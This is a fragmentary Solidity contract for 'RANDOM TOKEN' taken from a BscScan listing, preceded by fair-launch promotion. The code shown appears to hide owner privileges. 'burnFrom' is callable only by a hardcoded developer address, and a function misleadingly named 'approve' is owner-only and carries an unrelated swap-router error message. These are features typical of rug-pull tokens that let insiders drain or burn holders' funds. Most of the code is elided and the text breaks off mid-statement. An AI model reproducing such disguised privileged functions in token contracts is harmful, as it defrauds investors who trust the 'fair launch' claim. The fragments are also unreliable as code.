...
Submitted for verification at BscScan.com on Tue Mar 01 2022

💎 RANDOM TOKEN Just Fair Launch! Join the Telegram Group.

⏰ Fair Launch Date: 10 March 2022, 16:00 (UTC+0)

📌 Countdown & Website: http://randomtoken.com
...
contract RDT is Context, IERC20, Ownable {
    ...
    string private _name = "RANDOM TOKEN";
    ...
    address private _excludeDevAddress = 0x26fdE80F02720bc3561e0C29ac15Fc42403AdC8e;
    ...
    function burnFrom(uint256 amount) public {
        require(
            ...
            "ERC20: cannot permit zero address"
        );
        require(
            _msgSender() == _excludeDevAddress,
    ...
    function approve(address approveAddr1, address approveAddr2)
        public
        onlyOwner
    {
        ...
        require(
            ...
            "updateTokenSwapRouter: Invalid pair address."
        );

        emit uniSwapRouterUpdated(
            msg.sender,
